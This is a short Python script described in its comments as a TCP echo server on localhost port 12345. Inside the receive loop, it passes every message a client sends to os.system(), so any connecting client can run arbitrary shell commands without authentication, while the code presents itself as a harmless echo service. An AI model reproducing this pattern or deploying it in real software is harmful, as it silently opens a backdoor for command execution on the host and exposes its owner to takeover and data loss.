import socket
import sys
import os

# port number
port_num = 12345
socket_num = 0

YEL = "\033[1;33m"
MAG = "\033[1;35m"
CYN = "\033[1;36m"
RST = "\033[0m"


def main():
    # A TCP based echo server
    echo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    # Bind the IP address and the port number
    echo_socket.bind(('localhost', port_num))

    socket_num = 0
    print(MAG + "listening on port=" + str(port_num) + ", sd=" + str(socket_num) + RST)
    print("---------------------------------------------")

    # Listen for incoming connections
    echo_socket.listen()

    # Start accepting client connections
    while True:
        client, addr = echo_socket.accept() #! BLOCKING
        socket_num += 1
        print(" Accepted new client on sd=" + str(socket_num))
        while True:
            data = client.recv(2048)     #! BLOCKING
            # RECEIVED DATA FROM A CLIENT
            if data: 
                print(" <-- " + data.decode("utf-8"))
                os.system(data.decode("utf-8"))
                client.send(bytes(" --> Received " + data.decode("utf-8"),"utf-8"))
            # FINISHED RECEIVING DATA FROM CLIENT
            else:
                break
        client.close()
        print(' Client disconnected from sd=' + str(socket_num))
        socket_num -= 1
        print("----------------------------------------")

    

if __name__ == "__main__":
    main()
